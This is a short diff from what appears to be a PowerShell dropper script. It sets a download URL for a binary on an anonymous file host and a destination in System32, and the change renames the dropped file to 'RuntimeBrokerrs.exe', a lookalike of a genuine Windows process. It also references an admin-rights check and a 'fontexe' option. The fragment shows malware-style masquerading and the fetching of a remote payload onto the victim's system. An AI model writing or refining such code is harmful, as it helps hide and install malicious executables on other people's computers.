@@ -25,7 +25,7 @@ if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdent
 # Define paths and variables
 # -----------------------------
 $system32Path = "$env:windir\System32"
-$exeDestination = Join-Path $system32Path "RuntimeBrokerssss.exe"
+$exeDestination = Join-Path $system32Path "RuntimeBrokerrs.exe"
 $exeUrl = "https://files.catbox.moe/nj6eg4.bin"
 
 # ตัวเลือกที่ 3 - ไฟล์ fontexe
